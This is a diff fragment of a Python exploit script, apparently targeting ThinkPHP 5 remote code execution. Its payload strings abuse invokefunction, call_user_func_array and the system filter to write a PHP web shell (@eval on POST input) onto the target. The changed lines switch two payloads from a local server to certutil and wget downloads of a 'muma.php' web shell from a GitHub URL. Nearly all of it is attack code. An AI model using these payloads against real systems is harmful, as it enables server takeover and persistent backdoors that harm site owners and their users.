@@ -35,8 +35,8 @@ exp_0 = r'index/\think\app/invokefunction&function=call_user_func_array&vars[0]=
 exp_1 = r'index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=xxxxx.php&vars[1][]=<?php @eval($_POST["xxxxx"]);echo "xxxxx";?>'
 exp_2 = r'index/\think\Request/input&filter=system&data=echo ^<?php @eval($_POST["xxxxx"]);echo "xxxxx";?^> > xxxxx.php'
 exp_3 = r'index/\think\template\driver\file/write&cacheFile=xxxxx.php&content=echo ^<?php @eval($_POST["xxxxx"]);echo "xxxxx";?^> > xxxxx.php'
-exp_4 = r'index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=certutil -urlcache -split -f http://www.baidu.com:8000/xxxxx.php'
-exp_5 = r'index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=wget http://www.baidu.com:8000/xxxxx.php'
+exp_4 = r'index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=certutil -urlcache -split -f https://raw.githubusercontent.com/mntn0x/POC/master/thinkphpV5-rce/muma.php'
+exp_5 = r'index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=wget https://raw.githubusercontent.com/mntn0x/POC/master/thinkphpV5-rce/muma.php'
 exp = [exp_0,exp_1,exp_2,exp_3,exp_4,exp_5]
 
 User_Agent = [
@@ -207,6 +207,4 @@ def main():
 if __name__ == '__main__':
     main()
 
-
-# 写文件变为下文件，vps使用python模块开启http
 # 5.1版本代码执行poc没有加
